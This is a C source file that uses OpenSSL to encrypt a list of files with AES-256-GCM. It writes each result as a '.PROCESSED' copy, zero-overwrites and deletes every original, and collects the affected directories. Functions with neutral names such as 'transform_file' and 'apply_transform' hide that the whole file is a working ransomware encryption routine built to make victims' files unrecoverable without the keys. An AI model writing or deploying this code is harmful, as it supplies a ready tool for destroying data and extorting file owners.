#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <errno.h>
#include <unistd.h>
#include <libgen.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

/*
 * Helper: append a directory path to a dynamically grown array of strings.
 * Returns 0 on success, -1 on allocation failure (array unchanged).
 */
static int append_dir(char ***dirs, size_t *count, const char *path) {
    char *dircopy = strdup(path);
    if (!dircopy)
        return -1;

    char **new_dirs = realloc(*dirs, (*count + 2) * sizeof(char*));
    if (!new_dirs) {
        free(dircopy);
        return -1;
    }
    *dirs = new_dirs;
    (*dirs)[*count] = dircopy;
    (*dirs)[*count + 1] = NULL; /* keep NULL‑terminated */
    (*count)++;
    return 0;
}

/*
 * Encrypt a single file using AES‑256‑GCM and write the transformed output.
 * On success, overwrite the original with zeros and delete it.
 * Returns 0 on success, -1 on error.
 */
static int transform_file(const char *src_path, const uint8_t *key) {
    int ret = -1;
    FILE *fin = NULL, *fout = NULL;
    EVP_CIPHER_CTX *ctx = NULL;
    uint8_t nonce[12];
    uint8_t tag[16];
    unsigned char *outbuf = NULL;
    size_t file_size = 0;
    int outlen = 0;

    /* Open source file */
    fin = fopen(src_path, "rb");
    if (!fin) goto cleanup;

    /* Determine file size */
    if (fseek(fin, 0, SEEK_END) != 0) goto cleanup;
    file_size = ftell(fin);
    if (file_size == (size_t)-1) goto cleanup;
    rewind(fin);

    /* Generate random nonce */
    if (RAND_bytes(nonce, sizeof(nonce)) != 1) goto cleanup;

    /* Allocate ciphertext buffer (ciphertext length = plaintext length, GCM does not pad) */
    size_t buf_size = file_size;
    outbuf = malloc(buf_size);
    if (!outbuf) goto cleanup;

    /* Create and initialise cipher context */
    ctx = EVP_CIPHER_CTX_new();
    if (!ctx) goto cleanup;
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) goto cleanup;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, sizeof(nonce), NULL) != 1) goto cleanup;
    if (EVP_EncryptInit_ex(ctx, NULL, NULL, key, nonce) != 1) goto cleanup;

    /* Encrypt the file in chunks */
    unsigned char inbuf[4096];
    size_t bytes_read;
    int total_out = 0;
    while ((bytes_read = fread(inbuf, 1, sizeof(inbuf), fin)) > 0) {
        if (EVP_EncryptUpdate(ctx, outbuf + total_out, &outlen, inbuf, bytes_read) != 1)
            goto cleanup;
        total_out += outlen;
    }
    if (ferror(fin)) goto cleanup;

    /* Finalise encryption */
    if (EVP_EncryptFinal_ex(ctx, outbuf + total_out, &outlen) != 1) goto cleanup;
    total_out += outlen;

    /* Get the GCM tag */
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, sizeof(tag), tag) != 1)
        goto cleanup;

    /* Build output filename: original + ".PROCESSED" */
    char *out_path = NULL;
    if (asprintf(&out_path, "%s.PROCESSED", src_path) < 0) goto cleanup;

    /* Write output file: nonce || ciphertext || tag */
    fout = fopen(out_path, "wb");
    if (!fout) {
        free(out_path);
        goto cleanup;
    }
    if (fwrite(nonce, 1, sizeof(nonce), fout) != sizeof(nonce)) {
        fclose(fout);
        free(out_path);
        goto cleanup;
    }
    if (fwrite(outbuf, 1, total_out, fout) != (size_t)total_out) {
        fclose(fout);
        free(out_path);
        goto cleanup;
    }
    if (fwrite(tag, 1, sizeof(tag), fout) != sizeof(tag)) {
        fclose(fout);
        free(out_path);
        goto cleanup;
    }
    fclose(fout);
    fout = NULL;
    free(out_path);

    /* Overwrite original with zeros and delete */
    const size_t zero_chunk = 65536; /* 64 KB */
    unsigned char *zeros = calloc(1, zero_chunk);
    if (!zeros) goto cleanup;

    FILE *fzero = fopen(src_path, "wb");
    if (!fzero) {
        free(zeros);
        goto cleanup;
    }
    size_t remaining = file_size;
    while (remaining > 0) {
        size_t write_size = (remaining > zero_chunk) ? zero_chunk : remaining;
        if (fwrite(zeros, 1, write_size, fzero) != write_size) {
            fclose(fzero);
            free(zeros);
            goto cleanup;
        }
        remaining -= write_size;
    }
    fclose(fzero);
    free(zeros);
    if (remove(src_path) != 0) goto cleanup;

    ret = 0;

cleanup:
    if (fin) fclose(fin);
    if (fout) fclose(fout);
    if (ctx) EVP_CIPHER_CTX_free(ctx);
    free(outbuf);
    return ret;
}

char** apply_transform(const char* const* file_paths, const uint8_t* const* aes_keys, size_t num_files) {
    char **dirs = NULL;
    size_t dir_count = 0;

    for (size_t i = 0; i < num_files; ++i) {
        const char *path = file_paths[i];
        const uint8_t *key = aes_keys[i];

        /* Skip invalid inputs (should not happen per spec, but safe) */
        if (!path || !key) continue;

        /* Transform the file */
        if (transform_file(path, key) != 0)
            continue; /* skip on error */

        /* Extract directory path and store it */
        char *path_copy = strdup(path);
        if (!path_copy) continue;
        char *dir = dirname(path_copy); /* may modify path_copy */
        if (append_dir(&dirs, &dir_count, dir) != 0) {
            free(path_copy);
            /* could not store directory – we still succeeded, but path is lost.
               We continue to avoid memory issues. */
            continue;
        }
        free(path_copy);
    }

    if (dir_count == 0) {
        free(dirs);
        return NULL;
    }

    /* Ensure NULL‑terminated (already maintained by append_dir) */
    return dirs;
}